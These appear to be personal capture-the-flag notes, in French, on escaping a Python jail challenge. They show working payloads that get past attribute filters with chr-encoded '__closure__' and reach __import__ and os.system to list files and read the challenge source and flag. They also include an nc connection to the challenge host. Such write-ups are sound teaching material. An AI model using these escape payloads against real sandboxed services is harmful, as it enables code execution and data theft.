# Notes

as
os
or

## Ce qui marche bien d’après tes tests

    Fonctions built-in simples comme abs, bool, int, float, print, sum, sorted

    getattr fonctionne sur objets littéraux prédéfinis (ex: getattr(list(), "append") renvoie la méthode)

    isinstance fonctionne

    Types simples comme int, list, str sont accessibles (mais créer une variable locale semble bloqué)

## Ce qui ne marche pas

    Appeler vars(), locals() ou toute fonction qui accède à la portée actuelle est refusé (NameError ou ValueError)

    Les variables locales définies (ex: lst = []) ne sont pas conservées ou générent des erreurs au moment d’accès

    Pas possible de faire exec() ni eval()

    Pas d’accès direct à __import__

On peut voir que quand on utilise un "".join on peut accéder à des attributs interdits:

>>> getattr(portal, '__closure__')
Error: ValueError
>>> "".join([chr(x) for x in [95, 95, 99, 108, 111, 115, 117, 114, 101, 95, 95]])
'__closure__'
>>> getattr(portal, "".join([chr(x) for x in [95, 95, 99, 108, 111, 115, 117, 114, 101, 95, 95]]))
(<cell at 0x7e6fb4e026b0: Access object at 0x7e6fb4dc1ea0>, <cell at 0x7e6fb4e022f0: tuple object at 0x7e6fb4e06400>)
>>> %                                                                                                                                                                                                                                                                         ➜  ~  getattr(getattr(portal, "".join([chr(x) for x in [95,95,99,108,111,115,117,114,101,95,95]]))[1], "cell_contents")[1]

➜  ~  
nc 96.126.114.185 9969


=== Small Jail Portal===
portal is very user‑friendly, but it has a secret.
But portal is very picky to choose friends.
=========================================

>>> getattr(getattr(portal, "".join([chr(x) for x in [95,95,99,108,111,115,117,114,101,95,95]]))[1], "cell_contents")[1]
'BDSEC{w3lCom3_TO_PyJail}'
>>> "".join([chr(x) for x in [95,95,99,108,111,115,117,114,101,95,95]])
'__closure__'

```python
>>> [b:=getattr(print,"_"*2+"sel"+"f"+"_"*2),i:=getattr(b,"_"*2+"imp"+"ort"+"_"*2),o:=i("o"+"s"),s:=getattr(o,"sy"+"stem"),s("ls -a")]
.
..
.bash_logout
.bashprofile
.bashrc
pyJail.py
ynetd
[<module 'builtins' (built-in)>, <built-in function import>, <module 'os' (frozen)>, <built-in function system>, 0]


>>> [b:=getattr(print,""2+"sel"+"f"+"_"2),i:=getattr(b,""*2+"imp"+"ort"+""*2),o:=i("o"+"s"),s:=getattr(o,"sy"+"stem"),s("cat pyJail.py")]
#!/usr/bin/env python3
import builtins, signal, resource

FLAG = "BDSEC{w3lCom3_TO_PyJail}"
```